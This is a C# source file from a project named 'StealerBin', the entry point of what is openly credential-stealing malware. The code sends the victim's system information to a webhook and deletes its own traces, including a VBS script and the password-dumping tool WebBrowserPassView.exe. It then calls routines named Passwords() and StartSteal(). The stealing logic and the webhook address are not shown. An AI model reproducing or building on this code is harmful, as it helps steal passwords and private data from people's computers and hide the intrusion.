using System;
using System.IO;

namespace StealerBin
{
	internal class Hook
	{
		private static void Main(string[] args)
		{
            new API(API.Hook)
            {
                _name = API.name,
                _ppUrl = API.pfp
            }.SendSysInfo("**SYSTEM INFO**", "C:/temp/System_INFO.txt");
            File.Delete("C:/temp/System_INFO.txt");
            File.Delete("C:/temp/finalres.vbs");
            File.Delete("C:/temp/WebBrowserPassView.exe");
            API.Passwords();
            Stealer.StartSteal();
            Environment.Exit(0);
		}
	}
}
